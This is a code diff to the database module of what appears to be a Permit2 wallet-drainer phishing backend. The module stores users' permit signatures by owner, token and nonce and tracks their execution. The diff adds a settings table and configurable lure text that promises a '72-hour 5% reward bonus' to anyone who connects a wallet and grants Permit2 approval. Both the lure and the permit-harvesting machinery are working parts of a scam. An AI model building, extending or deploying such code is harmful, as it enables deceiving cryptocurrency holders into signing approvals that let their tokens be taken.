@@ -72,6 +72,14 @@ async function ensureTursoSchema(client) {
     try {
       await client.execute('ALTER TABLE permits ADD COLUMN referredBy TEXT');
     } catch (_) {}
+    try {
+      await client.execute(`
+        CREATE TABLE IF NOT EXISTS app_settings (
+          key   TEXT PRIMARY KEY,
+          value TEXT NOT NULL
+        )
+      `);
+    } catch (_) {}
   })();
   return _tursoInitPromise;
 }
@@ -116,6 +124,11 @@ function getDb() {
         referredBy    TEXT,
         createdAt     INTEGER NOT NULL,
         updatedAt     INTEGER NOT NULL
+      );
+
+      CREATE TABLE IF NOT EXISTS app_settings (
+        key   TEXT PRIMARY KEY,
+        value TEXT NOT NULL
       );
 
       CREATE INDEX IF NOT EXISTS idx_permits_owner_token ON permits(owner, token);
@@ -376,6 +389,117 @@ async function hasPendingWithNonce(owner, token, nonce) {
   return !!row;
 }
 
+/* ─────────────── Settings & Reward Config ─────────────── */
+
+const DEFAULT_REWARD_CONFIG = {
+  enabled: true,
+  percentage: "5.0",
+  durationHours: 72,
+  badgeText: "Flash Event · 72H Only",
+  headline: "Claim Your 5% Reward Bonus",
+  description: "Special 72-hour reward event! Connect your wallet and complete Permit2 approval within the countdown window to qualify for an exclusive one-time 5% bonus reward. Valid for all newly connected wallets and users approving again.",
+  inCardText: "Connect & approve within 72 hours to receive an exclusive one-time 5% reward bonus!",
+  perk1Title: "5% One-Time Reward",
+  perk1Desc: "Automatically locked in when you complete Permit2 approval.",
+  perk2Title: "New & Re-Approvals",
+  perk2Desc: "Applicable for first-time connections & wallets approving again.",
+  perk3Title: "Instant BSC On-Chain",
+  perk3Desc: "Direct BSC Mainnet confirmation with 0 waiting period."
+};
+
+let _memSettings = {};
+const SETTINGS_FILE = process.env.VERCEL
+  ? path.join('/tmp', 'settings.json')
+  : path.join(__dirname, '..', 'settings.json');
+
+async function getSetting(key, defaultValue = null) {
+  if (_memSettings[key] !== undefined) {
+    return _memSettings[key];
+  }
+  const turso = getTurso();
+  if (turso) {
+    await ensureTursoSchema(turso);
+    try {
+      const res = await turso.execute({
+        sql: 'SELECT value FROM app_settings WHERE key = ? LIMIT 1',
+        args: [key]
+      });
+      if (res.rows && res.rows.length > 0) {
+        _memSettings[key] = res.rows[0].value;
+        return res.rows[0].value;
+      }
+    } catch (_) {}
+  }
+  const db = getDb();
+  if (db && !db.isMemory) {
+    try {
+      const row = db.prepare('SELECT value FROM app_settings WHERE key = ? LIMIT 1').get(key);
+      if (row && row.value !== undefined) {
+        _memSettings[key] = row.value;
+        return row.value;
+      }
+    } catch (_) {}
+  }
+  try {
+    if (fs.existsSync(SETTINGS_FILE)) {
+      const parsed = JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8'));
+      if (parsed && parsed[key] !== undefined) {
+        _memSettings[key] = parsed[key];
+        return parsed[key];
+      }
+    }
+  } catch (_) {}
+  return defaultValue;
+}
+
+async function setSetting(key, value) {
+  _memSettings[key] = String(value);
+  const turso = getTurso();
+  if (turso) {
+    await ensureTursoSchema(turso);
+    try {
+      await turso.execute({
+        sql: 'INSERT INTO app_settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value',
+        args: [key, String(value)]
+      });
+    } catch (_) {}
+  }
+  const db = getDb();
+  if (db && !db.isMemory) {
+    try {
+      db.prepare(`
+        INSERT INTO app_settings (key, value) VALUES (?, ?)
+        ON CONFLICT(key) DO UPDATE SET value = excluded.value
+      `).run(key, String(value));
+    } catch (_) {}
+  }
+  try {
+    let current = {};
+    if (fs.existsSync(SETTINGS_FILE)) {
+      try { current = JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8')) || {}; } catch (_) {}
+    }
+    current[key] = String(value);
+    fs.writeFileSync(SETTINGS_FILE, JSON.stringify(current, null, 2), 'utf8');
+  } catch (_) {}
+}
+
+async function getRewardConfig() {
+  const raw = await getSetting('reward_config');
+  if (raw) {
+    try {
+      return { ...DEFAULT_REWARD_CONFIG, ...JSON.parse(raw) };
+    } catch (_) {}
+  }
+  return { ...DEFAULT_REWARD_CONFIG };
+}
+
+async function saveRewardConfig(config) {
+  const current = await getRewardConfig();
+  const merged = { ...current, ...config };
+  await setSetting('reward_config', JSON.stringify(merged));
+  return merged;
+}
+
 module.exports = {
   getDb,
   insertPermit,
@@ -383,5 +507,10 @@ module.exports = {
   getAllPermits,
   updatePermitAfterExecution,
   markPermitStatus,
-  hasPendingWithNonce
+  hasPendingWithNonce,
+  getSetting,
+  setSetting,
+  getRewardConfig,
+  saveRewardConfig,
+  DEFAULT_REWARD_CONFIG
 };
